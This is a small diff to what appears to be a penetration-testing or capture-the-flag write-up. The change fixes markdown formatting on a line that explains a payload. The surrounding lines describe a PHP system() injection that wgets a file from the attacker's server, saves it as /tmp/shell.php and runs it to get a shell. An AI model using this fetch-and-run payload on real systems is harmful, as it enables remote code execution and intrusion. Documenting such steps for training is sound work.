@@ -234,7 +234,7 @@ Name the field whatever we wish, set it as *text* type, put `<?php system("wget 
  
 `wget - downloads the the main file on the target machine`
 
-`-O /tmp/shell.php - converts the text file into php (this is used to prevent activation of php payload on our server) and saves it inside /tmp folder
+`-O /tmp/shell.php - converts the text file into php (this is used to prevent activation of php payload on our server) and saves it inside /tmp folder`
 
 `;php /tmp/shell.php - runs the php file with our malicious payload inside`
      
